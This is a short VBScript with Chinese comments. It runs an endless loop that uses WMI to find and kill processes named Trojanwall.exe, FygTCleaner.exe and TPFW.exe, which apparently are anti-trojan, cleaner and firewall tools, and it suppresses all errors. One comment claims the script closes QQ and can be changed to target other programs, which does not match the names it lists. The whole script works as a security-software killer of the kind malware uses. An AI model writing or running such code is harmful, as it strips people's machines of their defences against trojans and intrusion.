on error resume next

do while true
     for each ps in getobject("winmgmts:\\.\root\cimv2:win32_process").instances_  '循环进程 
  if ps.name="Trojanwall.exe" or ps.name="FygTCleaner.exe" or ps.name="TPFW.exe"    then  '关闭QQ,也可以改成其它的程序
                 ps.terminate
           end if
     next 
     wscript.sleep 1
loop 